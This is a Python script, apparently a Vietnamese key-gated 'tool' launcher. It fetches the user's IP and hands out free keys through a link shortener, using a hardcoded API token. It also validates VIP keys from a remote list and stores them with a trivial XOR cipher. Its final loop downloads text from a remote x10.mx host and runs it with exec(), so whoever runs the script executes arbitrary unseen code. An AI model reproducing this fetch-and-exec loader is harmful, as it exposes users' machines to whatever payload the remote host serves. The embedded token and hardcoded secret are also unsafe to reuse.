import threading
import base64
import os
import time
import re
import json
import random
import requests
import socket
import sys
from time import sleep
from datetime import datetime, timedelta
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
from requests import session
from colorama import Fore, Style
import pystyle

def check_connection():
    try:
        response = requests.get("https://www.google.com.vn", timeout=3)
    except (requests.exceptions.ReadTimeout, requests.ConnectionError):
        print("https://raw.githubusercontent.com/KHANHDZAI404/Tool/refs/heads/main/Tool.txt")
        sys.exit()
    except (requests.exceptions.RequestException, Exception) as e:
        print(f"Lỗi: {str(e)}")

check_connection()

KEY_GITHUB_URL = "https://www.webkey.x10.mx/Keyvip/"
DEVICE_FILE = 'vip_devices.json'

def lay_key_vip():
    try:
        response = requests.get(KEY_GITHUB_URL)
        if response.status_code == 200:
            lines = response.text.strip().splitlines()
            keys = {}
            for line in lines:
                parts = line.split('|')
                if len(parts) == 4:
                    key_info = {
                        'expire_date': parts[1].strip(),
                        'type': parts[2].strip(),
                        'max_devices': int(parts[3].strip())
                    }
                    keys[parts[0].strip()] = key_info
            return keys
        else:
            print("[</>] Không thể truy cập key VIP.")
            return {}
    except:
        print("[</>] Lỗi khi lấy key VIP.")
        return {}


def load_vip_devices():
    try:
        with open(DEVICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_vip_devices(data):
    with open(DEVICE_FILE, 'w') as f:
        json.dump(data, f)

secret_key = base64.urlsafe_b64encode(os.urandom(32))
SECRET = "my_secret_key"

def xor_crypt(data, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def enc(data):
    raw = xor_crypt(data, SECRET)
    return raw.encode('utf-8').hex()

def dec(encrypted_data):
    raw = bytes.fromhex(encrypted_data).decode('utf-8')
    return xor_crypt(raw, SECRET)



def bes4(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            version_tag = soup.find('span', id='version')
            maintenance_tag = soup.find('span', id='maintenance')
            version = version_tag.text.strip() if version_tag else None
            maintenance = maintenance_tag.text.strip() if maintenance_tag else None
            return version, maintenance
    except requests.RequestException:
        return None, None
    return None, None

def checkver():
    url = 'https://webkeyduykhanh.blogspot.com/2025/05/thong-tin-phien-ban-cong-cu-body-font_70.html?m=1'
    version, maintenance = bes4(url)
    if maintenance == 'on':
        sys.exit()
    return version

current_version = checkver()
if current_version:
    print(f"[</>] Phiên bản hiện tại: {current_version}")
else:
    print("Không thể lấy thông tin phiên bản hoặc tool đang được bảo trì.")
    sys.exit()

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""
██████╗░██╗░░░██╗████████╗░█████╗░░█████╗░██╗░░░░░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
██████╔╝╚██╗░██╔╝░░░██║░░░██║░░██║██║░░██║██║░░░░░
██╔══██╗░╚████╔╝░░░░██║░░░██║░░██║██║░░██║██║░░░░░
██║░░██║░░╚██╔╝░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝

TOOL BY: DUY KHÁNH             PHIÊN BẢN : 3.0
════════════════════════════════════════════════  
[</>] BOX ZALO : https://zalo.me/g/nguadz335
[</>] KÊNH YOUTUBE : REVIEWTOOL247NDK
[</>] ADMIN TOOL : DUYKHANH
❤ CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI TOOL ❤
════════════════════════════════════════════════  
              [THÔNG BÁO]
>>>>TOOL ĐANG TRONG QUÁ TRÌNH PHÁT TRIỂN THÊM<<<<   
❗MUA KEY VIP LIÊN HỆ ADMIN CHỈ 700đ/ 1 DAY❗  
════════════════════════════════════════════════                                
"""
    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()
        sleep(0.000001)

def get_ip_address():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        ip_data = response.json()
        return ip_data['ip']
    except Exception as e:
        print(f"Lỗi khi lấy địa chỉ IP : {e}")
        return None

def display_ip_address(ip_address):
    if ip_address:
        banner()
        print(f"[</>] Địa chỉ IP : {ip_address}")        
    else:
        print("https://raw.githubusercontent.com/KHANHDZAI404/Tool/refs/heads/main/Tool.txt")

def luu_thong_tin_ip(ip, key, expiration_date):
    data = {ip: {'key': key, 'expiration_date': expiration_date.isoformat()}}
    encrypted_data = enc(json.dumps(data))
    with open('ip_key.json', 'w') as file:
        file.write(encrypted_data)

def tai_thong_tin_ip():
    try:
        with open('ip_key.json', 'r') as file:
            encrypted_data = file.read()
        data = json.loads(dec(encrypted_data))
        return data
    except FileNotFoundError:
        return None
        sys.exit()

def kiem_tra_ip(ip):
    data = tai_thong_tin_ip()
    if data and ip in data:
        expiration_date = datetime.fromisoformat(data[ip]['expiration_date'])
        if expiration_date > datetime.now():
            return data[ip]['key']
    return None

check_connection()

def generate_key_and_url(ip_address):
    ngay = int(datetime.now().day)
    key1 = str(ngay * 27 + 27)
    ip_numbers = ''.join(filter(str.isdigit, ip_address))
    key = f'NDK{key1}{ip_numbers}'
    expiration_date = datetime.now().replace(hour=23, minute=59, second=0, microsecond=0)
    url = f'https://www.webkey.x10.mx/?ma={key}'
    return url, key, expiration_date

def da_qua_gio_moi():
    now = datetime.now()
    midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
    return now >= midnight

def get_shortened_link_phu(url):
    try:
        token = "6648c8f016f35d42cd052655"
        api_url = f"https://link4m.co/api-shorten/v2?api={token}&url={url}"
        response = requests.get(api_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data
        else:
            return {"status": "error", "message": "Không thể kết nối đến dịch vụ rút gọn URL."}
    except Exception as e:
        return {"status": "error", "message": f"Lỗi khi rút gọn URL: {e}"}

def main():
    ip_address = get_ip_address()
    display_ip_address(ip_address)

    if ip_address:
        existing_key = kiem_tra_ip(ip_address)
        if existing_key:
            print(f"[</>] Tool còn hạn, mời bạn dùng tool...")
            time.sleep(2)
        else:
            if da_qua_gio_moi():
                print("[</>] Quá giờ sử dụng tool !!!")
                return

            url, key, expiration_date = generate_key_and_url(ip_address)
            with ThreadPoolExecutor(max_workers=2) as executor:
                print("[</>] Nhập 1 Để Lấy Key (Free)")       
                print("[</>] Nhập 2 Để Nhập Key (VIP)")       
                print("════════════════════════════════════════════════")
                
                while True:
                    try:
                        choice = input("[</>] Nhập lựa chọn: ")                        
                        check_connection()
                        print("════════════════════════════════════════════════")
                        if choice == "1":                        	                   
                            yeumoney_future = executor.submit(get_shortened_link_phu, url)
                            yeumoney_data = yeumoney_future.result()
                            if yeumoney_data and yeumoney_data.get('status') == "error":
                                print(yeumoney_data.get('message'))
                                return
                            else:
                                link_key_yeumoney = yeumoney_data.get('shortenedUrl')
                                print('[</>] Link Để Vượt Key Là :', link_key_yeumoney)
                            while True:
                                keynhap = input('[</>] Key Đã Vượt Là : ')
                                if keynhap == key:
                                    print('[</>] Key Đúng Mời Bạn Dùng Tool.....')
                                    sleep(2)
                                    luu_thong_tin_ip(ip_address, keynhap, expiration_date)
                                    return
                                else:
                                    print('[</>] Key Sai Vui Lòng Vượt Lại Link :', link_key_yeumoney)
                        elif choice == "2":
                            keys_vip = lay_key_vip()
                            keynhap = input('[</>] Nhập Key [VIP] : ').strip()
                            if keynhap in keys_vip:
                                key_info = keys_vip[keynhap]
                                try:
                                    expire = datetime.strptime(key_info['expire_date'], "%d/%m/%Y")
                                    if expire > datetime.now():
                                        devices_data = load_vip_devices()
                                        used_devices = devices_data.get(keynhap, [])
                                        if ip_address not in used_devices:
                                            if len(used_devices) < key_info['max_devices']:
                                                used_devices.append(ip_address)
                                                devices_data[keynhap] = used_devices
                                                save_vip_devices(devices_data)
                                            else:
                                                print(f"[</>] Key VIP đã đạt số lượng thiết bị tối đa ({key_info['max_devices']})!")
                                                return
                                        expiration_date = expire.replace(hour=23, minute=59, second=0, microsecond=0)
                                        print(f"[</>] Loại key      : {key_info['type']}")
                                        print(f"[</>] Hết hạn       : {expiration_date.strftime('%H:%M:%S - %d/%m/%Y')}")
                                        print(f"[</>] Thiết bị đã dùng: {len(used_devices)}/{key_info['max_devices']}")
                                        sleep(5)
                                        luu_thong_tin_ip(ip_address, keynhap, expiration_date)
                                        return
                                    else:
                                        print('[</>] Key VIP Không Tồn Tại hoặc đã hết hạn!')
                                except:
                                    print('[</>] Lỗi xử lý ngày hết hạn.')
                            else:
                                print('[</>] Key VIP Không Tồn Tại!')
                    except ValueError:
                        print("Vui lòng nhập số hợp lệ !!!")
                    except KeyboardInterrupt:
                        print("[</>] Cảm ơn bạn đã dùng Tool !!!")
                        sys.exit()

if __name__ == '__main__':
    main()
check_connection()   

while True:
    try:
        exec(requests.get('https://www.webkey.x10.mx/Toolkhanh/xx7xx.txt').text)
    except KeyboardInterrupt:
        print("[</>] Cảm ơn bạn đã dùng Tool !!!")
        sys.exit()
